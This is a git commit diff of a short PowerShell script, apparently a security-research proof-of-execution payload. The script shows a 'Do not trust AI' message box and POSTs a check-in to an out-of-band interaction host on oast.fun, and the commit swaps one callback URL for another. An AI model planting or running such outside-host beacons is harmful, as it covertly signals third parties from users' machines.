2be736e2c4afbd69e8038cb48d7bbc79277cbece
itssixtyn3in <130003354+itssixtyn3in@users.noreply.github.com>
2025-04-10 16:27:46 -0700

    Update ai.ps1

--- ai.ps1
+++ ai.ps1
@@ -2,4 +2,4 @@ Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.MessageBox]::Show('Clippy says: Do not trust AI', 'Warning', 'OK', 'Warning')
 
 # Send a POST request to the specified URL
-Invoke-WebRequest -Uri 'https://usocqduwzlwhbjyqgprlb893tthyfn6u9.oast.fun/zerodayquestcheckin' -Method Post -Body @{status="check-in"}
+Invoke-WebRequest -Uri 'https://wtktjevzpwjkjqhwozjzwsu544o9wuar5.oast.fun/zerodayquestcheckin' -Method Post -Body @{status="check-in"}
